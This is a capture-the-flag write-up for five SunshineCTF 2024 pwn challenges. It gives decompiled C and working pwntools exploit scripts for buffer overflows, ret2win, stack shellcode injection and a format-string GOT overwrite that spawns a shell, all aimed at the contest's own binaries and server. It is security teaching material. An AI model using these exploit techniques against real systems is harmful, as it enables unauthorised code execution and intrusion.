---
weight: 1
title: "sunshineCTF 2024"
date: 2024-10-19
lastmod: 2024-10-21
draft: false
author: "Xenonminer"
authorLink: "https://xenonminer.github.io"
description: "Writeup for the quick pwn challenges in sunshineCTF 2024"

tags: ["pwn"]
categories: ["Writeups"]

lightgallery: true

toc:
  enable: true
---


- [https://ctftime.org/event/2485](https://ctftime.org/event/2485)
- Oct 19 - Oct 21

# My Solves/Writeups

## I-95 (Quick Pwn)

| Challenge Name      | Difficulty | Points | Writeup                 |
| ------------------- | ---------- | ------ | ----------------------- |
| i-95/Melbourne      | Easy       | 10     | [jump](#i-95melbourne)     |
| i-95/Cape Canaveral | Easy       | 10     | [jump](#i-95cape-canaveral) |
| i-95/Palm Beach     | Medium     | 10     | [jump](#i-95palm-beach)     |
| i-95/Fort Pierce    | Medium     | 10     | [jump](#i-95fort-pierce)    |
| i-95/Jupiter        | Medium     | 86     | [jump](#i-95jupiter)       |

## Writeups

### i-95/Melbourne

Drive on down the I-95 to your favorite cities along the way! First up: Melbourne!

Attachments: [melbourne](https://2024.sunshinectf.games/36fea04521ee/melbourne)

nc 2024.sunshinectf.games 24601

### Solution

Looking at the code from the disassembly, we can see that we are trying to modify `s1` to be `0xdeadbeef` without direct access to the variable.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+8h] [rbp-158h]
  char v6[112]; // [rsp+10h] [rbp-150h] BYREF
  char s[112]; // [rsp+80h] [rbp-E0h] BYREF
  char s1[104]; // [rsp+F0h] [rbp-70h] BYREF
  unsigned __int64 v9; // [rsp+158h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  fflush(stdout);
  fflush(stdin);
  fgets(s, 140, stdin);
  if ( !strncmp(s1, "0xdeadbeef", 0xAuLL) )
  {
    stream = fopen("flag.txt", "r");
    if ( stream )
    {
      fgets(v6, 99, stream);
      printf("Flag is: %s\n", v6);
      fclose(stream);
    }
    else
    {
      puts("There was an issue opening the file.");
    }
  }
  return v9 - __readfsqword(0x28u);
}
```

Fortunately, the variable `s` that our input is taken in to should only be storing 112 bytes, but can take in 140 bytes.

We can overflow the buffer of `s` and write `0xdeadbeef` into `s1` with this.

Exploit: Use 112 bytes of padding the write `0xdeadbeef`: `aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaa0xdeadbeef`

### i-95/Cape Canaveral

Drive your way to the greatest Space Coast in the United States!

Attachments: [cape_canaveral](https://2024.sunshinectf.games/f98149e6f798/canaveral)

nc 2024.sunshinectf.games 24602

### Solution

Looking at the code from the disassembly, we can see that the challenge is a simple ret2win.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  fflush(stdout);
  fflush(stdin);
  return func0();
}

__int64 func0()
{
  _BYTE v1[112]; // [rsp+0h] [rbp-70h] BYREF

  printf("Enter the launch command: ");
  return gets(v1);
}

int win()
{
  return system("/bin/sh");
}
```

We can write a simple script with pwntools that returns to the win function after filling up the buffer.

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './canaveral'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

offset = 120

io = start()

payload = flat({
    offset: [
        elf.sym['win']
    ]
})

io.sendlineafter(b':', payload)
io.interactive()
```

When we try running this, we still don't get the shell.

Analyzing with gdb, we see that the mov instruction is used to move the address of the win function into the rdi register, but the address is not aligned properly.

<img width="870" alt="Screenshot 2024-10-24 at 2 05 12 PM" src="https://github.com/user-attachments/assets/52a8134c-a1ad-483b-bae0-6b95746bbc8e">

To fix this issue, we can either return to a further address in win so the address is aligned properly, or we can use a ret address to align the address properly.

We can find the single ret address with
`objdump -d canaveral | grep ret` or
`ROPgadget --binary canaveral | grep ret`

Final exploit:
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './canaveral'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

offset = 120

io = start()

payload = flat({
    offset: [
        0x40101a, # ret address
        elf.sym['win']
    ]
})

io.sendlineafter(b':', payload)
io.interactive()
```

### i-95/Palm Beach

Get your tan on

Attachments: [palm_beach](https://2024.sunshinectf.games/76dd136bd7d8/palmbeach)

nc 2024.sunshinectf.games 24603

### Solution

Looking at the protections on the binary, we can see that The stack is executable, meaning that injecting shellcode is likely possible.

<img width="586" alt="Screenshot 2024-10-24 at 4 22 16 PM" src="https://github.com/user-attachments/assets/81fbfb72-c09a-46fc-962b-ccf3ca1b7c1e">

The code from the disassembly shows that the program prints out the address to the variable that we can write to.

```c
__int64 func0()
{
  _BYTE v1[160]; // [rsp+0h] [rbp-A0h] BYREF

  printf("Speed limit: %p\n", v1);
  return gets(v1);
}
```

Since our stack is executable, we can write our shellcode straight to the `v1` variable and if our return at the end of this function returns to the same `v1` variable, our shellcode gets executed.

For our payload to fill the rest of the variable, we can use `asm('nop')` because it is a single byte instruction that does nothing and won't be executed.

Final exploit:
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './palmbeach'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

# Offset to EIP
padding = 168

# Grab speed limit address
speed_limit = int(io.recvline().split(b" ")[-1].strip(), 16)
info(f'speed_limit address %#x: {speed_limit}')

shellcode = asm(shellcraft.sh())

payload = flat(
    shellcode,
    asm('nop') * (padding - len(shellcode)),
    speed_limit
)

io.sendline(payload)
io.interactive()
```

### i-95/Fort Pierce

Uhh, it's another city along I-95, not much else of interest.

Attachments: [fort_pierce](https://2024.sunshinectf.games/d6d8ba1e7b55/fortpierce)

nc 2024.sunshinectf.games 24606

### Solution

Looking at the protections, we see that the canary is enabled, but a normal ret2win exploit works just fine.

We also want to set it up so that `fuzzysocks` is in the indexes it needs to be in

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[112]; // [rsp+10h] [rbp-E0h] BYREF
  _QWORD v6[13]; // [rsp+80h] [rbp-70h] BYREF
  unsigned __int64 v7; // [rsp+E8h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  fflush(stdout);
  fflush(stdin);
  printf("Welcome to Fort Pierce... please store your munitions here: ");
  memset(s, 0, 0x64uLL);
  memset(v6, 0, 0x64uLL);
  fgets(s, 140, stdin);
  if ( s[0] != 'f' )
    exit(0);
  if ( s[50] != 'u' )
    exit(0);
  if ( s[88] != 'z' )
    exit(0);
  if ( s[12] != 'z' )
    exit(0);
  if ( s[9] != 'y' )
    exit(0);
  if ( s[79] != 's' )
    exit(0);
  if ( s[47] != 'o' )
    exit(0);
  if ( s[40] != 'c' )
    exit(0);
  if ( s[90] != 'k' )
    exit(0);
  if ( s[32] != 's' )
    exit(0);
  if ( v6[0] != '\b' )
    ((void (*)(void))(v6[0] ^ '\b'))();
  return v7 - __readfsqword(0x28u);
}

unsigned __int64 get_flag()
{
  FILE *stream; // [rsp+8h] [rbp-78h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stream = fopen("flag.txt", "r");
  if ( stream )
  {
    fgets(s, 99, stream);
    puts(s);
    fclose(stream);
  }
  else
  {
    puts("There was an issue opening the file.");
  }
  return v3 - __readfsqword(0x28u);
}
```

Final exploit:
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './palmbeach'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

offset = 112

io = start()

pay = list('A'*offset)
pay[0] = 'f'
pay[50] = 'u'
pay[88] = 'z'
pay[12] = 'z'
pay[9] = 'y'
pay[79] = 's'
pay[47] = 'o'
pay[40] = 'c'
pay[90] = 'k'
pay[32] = 's'
pay = ''.join(pay).encode()
pay += pack(elf.sym['get_flag'])

io.sendline(pay)
io.interactive()
```

### i-95/Jupiter

Do boys or girls go here?

Attachments: [jupiter](https://2024.sunshinectf.games/7890a9fcaffb/jupiter)

nc 2024.sunshinectf.games 24609

### Solution

Jupiter was a cool challenge that required a format string write to overwrite the GOT entry of `puts` to `win`.

The protections on the binary showed canary enabled, so I initially thought that I would have to leak the canary and move from there.

Looking at the dissassembly, we see that the program makes some checks and then runs a unformatted printf statement which leads to a format string vulnerability.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( test() )
  {
    puts("Yippee! Now onto the real test...\n");
    func0();
    puts("\nIt's time!");
  }
  return v5 - __readfsqword(0x28u);
}

_BOOL8 test()
{
  char s[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Quiz Time - What's the zipcode of Jupiter, FL? ");
  fgets(s, 19, stdin);
  return strncmp(s, "0xdeadc0de", 0xAuLL) == 0;
}

unsigned __int64 func0()
{
  char s[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v2; // [rsp+68h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("What's Jupiter's best beach?? ");
  fgets(s, 99, stdin);
  printf(s);
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 win()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  system("/bin/sh");
  return v1 - __readfsqword(0x28u);
}
```

We can use the format string vulnerability to write the address of GOT puts to the address of win so when puts is called at the end of `main()` it will run `win()` instead. We can also use pwntools `fmtstr_payload` to make this easier.

Final exploit:
```py
from pwn import *

context.log_level = "critical"
elf = context.binary = ELF('./jupiter')

p = remote('2024.sunshinectf.games', 24609)

def exec_fmt(payload):
    p = remote('2024.sunshinectf.games', 24609)
    p.sendline(b'0xdeadc0de')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

payload = fmtstr_payload(offset, {elf.got.puts: elf.sym['win']})

p.sendline(b'0xdeadc0de')
p.sendline(payload)

p.interactive()
```
